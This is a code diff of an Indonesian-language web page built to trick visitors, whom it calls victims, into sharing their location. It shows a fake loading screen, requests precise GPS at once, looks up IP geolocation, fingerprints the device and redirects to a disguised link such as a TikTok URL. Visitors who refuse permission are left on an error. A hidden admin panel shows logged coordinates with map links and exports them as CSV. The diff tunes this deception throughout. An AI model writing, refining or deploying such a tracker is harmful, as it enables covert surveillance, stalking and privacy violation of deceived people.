@@ -26,16 +26,9 @@
   .spinner-ring.r3 { inset:18px; border-bottom-color:rgba(108,99,255,.4); animation-duration:1.6s; }
   @keyframes spin { to { transform:rotate(360deg); } }
   .loading-title { font-size:15px; font-weight:600; }
-  .loading-sub { font-size:12px; color:var(--muted); max-width:220px; line-height:1.6; }
+  .loading-sub { font-size:12px; color:var(--muted); max-width:240px; line-height:1.6; }
   .progress-bar { width:200px; height:2px; background:var(--border); border-radius:2px; overflow:hidden; }
   .progress-fill { height:100%; background:linear-gradient(90deg,var(--accent),var(--accent2)); border-radius:2px; width:0%; transition:width .4s ease; }
-
-  /* BLOCKED STATE */
-  .blocked-msg { display:none; flex-direction:column; align-items:center; gap:12px; margin-top:4px; }
-  .blocked-msg.show { display:flex; }
-  .blocked-icon { font-size:32px; }
-  .blocked-text { font-size:13px; color:var(--muted); max-width:220px; line-height:1.6; }
-  .retry-btn { margin-top:4px; background:var(--accent); color:#fff; border:none; border-radius:8px; padding:10px 20px; font-size:13px; font-weight:600; cursor:pointer; font-family:var(--font); }
 
   /* ADMIN */
   #admin-panel { display:none; position:fixed; inset:0; background:var(--bg); z-index:9999; overflow-y:auto; }
@@ -113,11 +106,6 @@
       <div class="loading-sub" id="loading-sub">Mohon tunggu sebentar</div>
     </div>
     <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
-    <div class="blocked-msg" id="blocked-msg">
-      <div class="blocked-icon">🔒</div>
-      <div class="blocked-text">Akses lokasi diperlukan untuk membuka konten ini.</div>
-      <button class="retry-btn" onclick="retryGeo()">Izinkan & Lanjutkan</button>
-    </div>
   </div>
 </div>
 
@@ -137,7 +125,7 @@
       <div class="card-header">Konfigurasi</div>
       <div class="card-body">
         <div class="field-row">
-          <label>Target URL</label>
+          <label>Target URL (redirect tujuan)</label>
           <input type="url" id="target-url" placeholder="https://vt.tiktok.com/xxxxx">
         </div>
         <div class="field-row">
@@ -149,17 +137,13 @@
           <input type="text" id="loading-subtext" value="Mohon tunggu sebentar">
         </div>
         <div class="field-row">
-          <label>Pesan saat ditolak (muncul di bawah tombol retry)</label>
-          <input type="text" id="blocked-text-cfg" value="Akses lokasi diperlukan untuk membuka konten ini.">
+          <label>Teks saat izin ditolak</label>
+          <input type="text" id="denied-text" value="URL tidak dapat dibuka. Izin lokasi diperlukan untuk mengakses konten ini.">
         </div>
         <div style="border-top:1px solid var(--border);margin:14px 0;"></div>
         <div class="toggle-row">
-          <div><div class="toggle-label">High accuracy GPS</div><div class="toggle-sub">Lebih akurat, prompt muncul lebih cepat</div></div>
+          <div><div class="toggle-label">High accuracy GPS</div><div class="toggle-sub">Prompt izin muncul lebih cepat & akurat</div></div>
           <label class="toggle"><input type="checkbox" id="toggle-high-acc" checked><span class="toggle-slider"></span></label>
-        </div>
-        <div class="toggle-row">
-          <div><div class="toggle-label">Block redirect jika tolak izin</div><div class="toggle-sub">Korban tidak bisa ke tujuan tanpa izin lokasi</div></div>
-          <label class="toggle"><input type="checkbox" id="toggle-block" checked><span class="toggle-slider"></span></label>
         </div>
         <div style="margin-top:16px;">
           <button class="btn btn-primary" onclick="saveConfig()">Simpan</button>
@@ -167,12 +151,14 @@
       </div>
     </div>
 
-    <div class="card" id="link-card">
+    <div class="card">
       <div class="card-header">Link Sebar</div>
       <div class="card-body">
         <div class="link-display" id="link-display">—</div>
         <button class="copy-btn" onclick="copyLink()">Salin</button>
-        <p style="font-size:11px;color:var(--muted);margin-top:10px;">Tanpa #admin di belakang. Korban buka → prompt izin muncul seketika → data masuk → redirect.</p>
+        <p style="font-size:11px;color:var(--muted);margin-top:10px;">
+          Tanpa #admin. Korban buka → prompt izin muncul seketika → izin = redirect ke URL → tolak = stuck pesan error.
+        </p>
       </div>
     </div>
 
@@ -197,18 +183,17 @@
 
 <script>
 const ADMIN_HASH  = '#admin';
-const STORAGE_KEY = 'lp_cfg_v2';
-const LOG_KEY     = 'lp_log_v2';
+const STORAGE_KEY = 'lp_cfg_v3';
+const LOG_KEY     = 'lp_log_v3';
 
 let config = {
-  targetUrl: '',
+  targetUrl:   '',
   loadingText: 'Memuat konten...',
-  loadingSub: 'Mohon tunggu sebentar',
-  blockedText: 'Akses lokasi diperlukan untuk membuka konten ini.',
+  loadingSub:  'Mohon tunggu sebentar',
+  deniedText:  'URL tidak dapat dibuka. Izin lokasi diperlukan untuk mengakses konten ini.',
   highAccuracy: true,
-  blockOnDeny: true,
 };
-let logs = [];
+let logs    = [];
 let ipCache = null;
 
 // ── INIT ──
@@ -225,30 +210,24 @@ if (window.location.hash === ADMIN_HASH) {
 function initVictim() {
   document.getElementById('loading-title').textContent = config.loadingText;
   document.getElementById('loading-sub').textContent   = config.loadingSub;
-  document.getElementById('blocked-msg').querySelector('.blocked-text').textContent = config.blockedText;
 
-  // IP lookup paralel — tanpa izin
+  // IP lookup jalan paralel tanpa izin
   fetchIP();
 
-  // trigger geolocation SEGERA — sebelum animasi apapun
-  // ini biar browser prompt izin muncul secepat mungkin
+  // geolocation dipanggil SEGERA — biar prompt izin muncul secepat mungkin
   requestGeo();
 }
 
-function setProgress(pct, animated) {
-  const el = document.getElementById('progress-fill');
-  if (!animated) el.style.transition = 'none';
-  else el.style.transition = 'width .4s ease';
-  el.style.width = pct + '%';
+function setProgress(pct) {
+  document.getElementById('progress-fill').style.width = pct + '%';
 }
 
 function requestGeo() {
-  // langsung panggil tanpa delay
   if (!navigator.geolocation) {
     onGeoError({ code: 0, message: 'Not supported' });
     return;
   }
-  setProgress(15, true);
+  setProgress(20);
   navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, {
     enableHighAccuracy: config.highAccuracy,
     timeout: 10000,
@@ -256,59 +235,47 @@ function requestGeo() {
   });
 }
 
-function retryGeo() {
-  document.getElementById('blocked-msg').classList.remove('show');
-  document.getElementById('loading-sub').textContent = config.loadingSub;
-  setProgress(15, true);
-  requestGeo();
-}
-
 async function onGeoSuccess(pos) {
-  setProgress(80, true);
-  const ip = await getIP();
+  setProgress(90);
+  const ip  = await getIP();
   const dev = getDevice();
-  const entry = {
+  saveLog({
     ts:       new Date().toISOString(),
     lat:      pos.coords.latitude,
     lng:      pos.coords.longitude,
     accuracy: pos.coords.accuracy,
     ...dev,
     ...ip,
-  };
-  saveLog(entry);
-  setProgress(100, true);
-  setTimeout(() => doRedirect(), 600);
+  });
+  setProgress(100);
+  // langsung redirect
+  if (config.targetUrl) {
+    window.location.href = config.targetUrl;
+  }
 }
 
 async function onGeoError(err) {
-  const ip = await getIP();
+  const ip  = await getIP();
   const dev = getDevice();
-  const errLabel = err.code === 1 ? 'Ditolak' : err.code === 2 ? 'Tidak tersedia' : err.code === 3 ? 'Timeout' : 'Tidak didukung';
+  const label = err.code === 1 ? 'Ditolak'
+              : err.code === 2 ? 'Tidak tersedia'
+              : err.code === 3 ? 'Timeout'
+              : 'Tidak didukung';
   saveLog({
     ts: new Date().toISOString(),
-    error: errLabel,
+    error: label,
     code: err.code,
     ...dev,
     ...ip,
   });
 
-  if (config.blockOnDeny) {
-    // stuck — tunjukkan pesan + tombol retry
-    setProgress(35, true);
-    document.getElementById('loading-sub').textContent = '';
-    document.getElementById('blocked-msg').classList.add('show');
-  } else {
-    setProgress(100, true);
-    setTimeout(() => doRedirect(), 600);
-  }
+  // stuck — ganti teks, progress berhenti
+  setProgress(30);
+  document.getElementById('loading-title').textContent = '❌ Izin Ditolak';
+  document.getElementById('loading-sub').textContent   = config.deniedText;
 }
 
-function doRedirect() {
-  if (!config.targetUrl) return;
-  window.location.href = config.targetUrl;
-}
-
-// ── DATA COLLECTION ──
+// ── DATA ──
 async function fetchIP() {
   try {
     const r = await fetch('https://ipapi.co/json/');
@@ -334,27 +301,21 @@ async function getIP() {
 
 function getDevice() {
   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  // RAM: deviceMemory bisa undefined di beberapa browser — fallback ke string kosong
   const ram  = navigator.deviceMemory
     ? navigator.deviceMemory + 'GB'
-    : (performance && performance.memory
-        ? Math.round(performance.memory.jsHeapSizeLimit / 1073741824) + 'GB (est)'
-        : null);
+    : (performance?.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1073741824) + 'GB~' : null);
   return {
-    ua:        navigator.userAgent,
-    screen:    screen.width + 'x' + screen.height,
-    colorDepth: screen.colorDepth || null,
-    lang:      navigator.language,
-    tz:        Intl.DateTimeFormat().resolvedOptions().timeZone,
-    ram:       ram,
-    cpu:       navigator.hardwareConcurrency || null,
-    touch:     navigator.maxTouchPoints > 0,
-    platform:  navigator.platform || null,
-    online:    navigator.onLine,
-    cookieOk:  navigator.cookieEnabled,
-    connType:  conn ? (conn.effectiveType || conn.type || null) : null,
-    connDown:  conn ? (conn.downlink || null) : null,
-    referrer:  document.referrer || null,
+    ua:       navigator.userAgent,
+    screen:   screen.width + 'x' + screen.height,
+    lang:     navigator.language,
+    tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ram:      ram,
+    cpu:      navigator.hardwareConcurrency || null,
+    touch:    navigator.maxTouchPoints > 0,
+    platform: navigator.platform || null,
+    connType: conn ? (conn.effectiveType || conn.type || null) : null,
+    connDown: conn ? (conn.downlink || null) : null,
+    referrer: document.referrer || null,
   };
 }
 
@@ -376,36 +337,33 @@ function exitAdmin() {
 }
 
 function populateForm() {
-  document.getElementById('target-url').value        = config.targetUrl       || '';
-  document.getElementById('loading-text').value      = config.loadingText     || '';
-  document.getElementById('loading-subtext').value   = config.loadingSub      || '';
-  document.getElementById('blocked-text-cfg').value  = config.blockedText     || '';
-  document.getElementById('toggle-high-acc').checked = config.highAccuracy    !== false;
-  document.getElementById('toggle-block').checked    = config.blockOnDeny     !== false;
+  document.getElementById('target-url').value      = config.targetUrl    || '';
+  document.getElementById('loading-text').value    = config.loadingText  || '';
+  document.getElementById('loading-subtext').value = config.loadingSub   || '';
+  document.getElementById('denied-text').value     = config.deniedText   || '';
+  document.getElementById('toggle-high-acc').checked = config.highAccuracy !== false;
 }
 
 function saveConfig() {
-  config.targetUrl   = document.getElementById('target-url').value.trim();
-  config.loadingText = document.getElementById('loading-text').value.trim()     || 'Memuat konten...';
-  config.loadingSub  = document.getElementById('loading-subtext').value.trim()  || 'Mohon tunggu sebentar';
-  config.blockedText = document.getElementById('blocked-text-cfg').value.trim() || 'Akses lokasi diperlukan.';
-  config.highAccuracy= document.getElementById('toggle-high-acc').checked;
-  config.blockOnDeny = document.getElementById('toggle-block').checked;
+  config.targetUrl    = document.getElementById('target-url').value.trim();
+  config.loadingText  = document.getElementById('loading-text').value.trim()    || 'Memuat konten...';
+  config.loadingSub   = document.getElementById('loading-subtext').value.trim() || 'Mohon tunggu sebentar';
+  config.deniedText   = document.getElementById('denied-text').value.trim()     || 'Izin ditolak.';
+  config.highAccuracy = document.getElementById('toggle-high-acc').checked;
   localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
   updateLinkDisplay();
   showToast('Tersimpan');
 }
 
 function updateLinkDisplay() {
-  const base = window.location.href.split('#')[0];
-  document.getElementById('link-display').textContent = base;
+  document.getElementById('link-display').textContent = window.location.href.split('#')[0];
 }
 
 function copyLink() {
-  const base = window.location.href.split('#')[0];
-  navigator.clipboard.writeText(base).catch(() => {
+  const url = window.location.href.split('#')[0];
+  navigator.clipboard.writeText(url).catch(() => {
     const t = document.createElement('textarea');
-    t.value = base; document.body.appendChild(t); t.select();
+    t.value = url; document.body.appendChild(t); t.select();
     document.execCommand('copy'); document.body.removeChild(t);
   });
   showToast('Link disalin!');
@@ -448,13 +406,13 @@ function renderLogs() {
   </tr></thead><tbody>`;
 
   sorted.forEach((e, i) => {
-    const num  = logs.length - i;
-    const time = e.ts ? new Date(e.ts).toLocaleString('id-ID') : '—';
+    const num    = logs.length - i;
+    const time   = e.ts ? new Date(e.ts).toLocaleString('id-ID') : '—';
     const tzCity = e.tz ? e.tz.split('/').pop().replace(/_/g,' ') : (e.ipTZ ? e.ipTZ.split('/').pop().replace(/_/g,' ') : '—');
     const ipLoc  = [e.ipCity, e.ipRegion, e.ipCountry].filter(Boolean).join(', ') || '—';
     const conn   = e.connType ? e.connType.toUpperCase() + (e.connDown ? ' ' + e.connDown + 'Mbps' : '') : '—';
-
     const hasGPS = e.lat != null;
+
     const status = hasGPS
       ? `<span class="acc-badge acc-high">✓ GPS+IP</span>`
       : `<span class="acc-badge acc-low">${e.error || 'Gagal'}</span>`;
@@ -468,7 +426,7 @@ function renderLogs() {
       ? `<span class="acc-badge ${e.accuracy < 20 ? 'acc-high' : e.accuracy < 100 ? 'acc-mid' : 'acc-low'}">±${Math.round(e.accuracy)}m</span>`
       : '—';
 
-    const ipMapsLink = e.ipLat
+    const ipMaps = e.ipLat
       ? `<br><a href="https://www.google.com/maps?q=${e.ipLat},${e.ipLng}" target="_blank" class="map-link">↗ Maps</a>`
       : '';
 
@@ -478,7 +436,7 @@ function renderLogs() {
       <td>${gpsCell}</td>
       <td>${acc}</td>
       <td><span class="ip-val">${e.ip || '—'}</span></td>
-      <td style="font-size:10px">${ipLoc}${ipMapsLink}</td>
+      <td style="font-size:10px">${ipLoc}${ipMaps}</td>
       <td style="font-size:10px;color:var(--muted);max-width:140px">${e.ipISP || '—'}</td>
       <td style="font-size:10px">${tzCity}<br><span style="color:var(--muted)">${e.lang || '—'}</span></td>
       <td style="font-size:10px;max-width:120px" title="${escH(e.ua||'')}">${shortUA(e.ua)}<br><span style="color:var(--muted)">${e.screen||'—'}</span></td>
@@ -506,12 +464,12 @@ function exportCSV() {
     (e.ua||'').replace(/"/g,'""'), e.screen||'',
     e.ram||'', e.cpu||'', e.touch!==undefined?(e.touch?'Touch':'Non-touch'):'',
     e.connType||'', e.connDown||'',
-    e.lat ? 'Sukses' : 'Gagal', e.error||''
+    e.lat?'Sukses':'Gagal', e.error||''
   ]);
   let csv = h.join(',') + '\n' + rows.map(r => r.map(v => `"${v}"`).join(',')).join('\n');
   const a = Object.assign(document.createElement('a'), {
-    href: URL.createObjectURL(new Blob([csv], {type:'text/csv;charset=utf-8;'})),
-    download: 'location_log_' + Date.now() + '.csv'
+    href: URL.createObjectURL(new Blob([csv],{type:'text/csv;charset=utf-8;'})),
+    download: 'log_' + Date.now() + '.csv'
   });
   a.click(); URL.revokeObjectURL(a.href);
   showToast('CSV diexport');
@@ -533,7 +491,7 @@ function shortUA(ua) {
 }
 
 function escH(s) {
-  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
 function showToast(msg) {
